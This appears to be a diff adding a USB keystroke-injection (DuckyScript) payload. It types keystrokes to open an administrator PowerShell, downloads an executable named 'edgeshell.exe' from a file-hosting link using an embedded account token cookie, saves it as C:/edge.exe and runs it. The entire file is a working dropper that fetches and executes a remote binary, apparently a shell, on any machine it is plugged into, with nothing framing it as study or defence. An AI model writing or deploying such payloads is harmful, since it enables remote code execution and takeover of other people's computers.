@@ -1,0 +1,59 @@
+REM OPEN POWERSHELL AS ADMIN
+GUI
+DELAY 1000
+STRING POWERSHELL
+DELAY 2000
+RIGHT
+DOWN
+ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 3000
+REM INSERT COMMAND THE TIMING CAN SUCK ON THIS PART
+STRING $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+ENTER 
+STRING $session.Cookies.Add((New-Object System.Net.Cookie("accountToken", "7RpHGlmzc2ro0WxriyuQ5HTO6XJwTk3p", "/", "store3.gofile.io")))
+ENTER
+STRING Invoke-WebRequest -UseBasicParsing -Uri "https://store3.gofile.io/download/web/7c3437fd-abec-4da5-93a3-3a823c1b4c1a/edgeshell.exe" `
+ENTER
+STRING -WebSession $session `
+ENTER
+STRING -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0" `
+ENTER
+STRING -Headers @{
+ENTER
+STRING "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+ENTER
+STRING  "Accept-Language" = "en-US,en;q=0.5"
+ENTER
+STRING  "Accept-Encoding" = "gzip, deflate, br, zstd"
+ENTER
+STRING  "Referer" = "https://gofile.io/"
+ENTER
+STRING  "DNT" = "1"
+ENTER
+STRING  "Sec-GPC" = "1"
+ENTER
+STRING  "Upgrade-Insecure-Requests" = "1"
+ENTER
+STRING  "Sec-Fetch-Dest" = "document"
+ENTER
+STRING  "Sec-Fetch-Mode" = "navigate"
+ENTER
+STRING  "Sec-Fetch-Site" = "same-site"
+ENTER
+STRING  "Sec-Fetch-User" = "?1"
+ENTER
+STRING  "Priority" = "u=0, i"
+ENTER
+STRING } -OutFile C:/edge.exe
+ENTER
+DELAY 3000
+REM RUN NEW FILE :)
+STRING C:\edge.exe
+DELAY 1000
+ENTER
+STRING exit
+ENTER
+
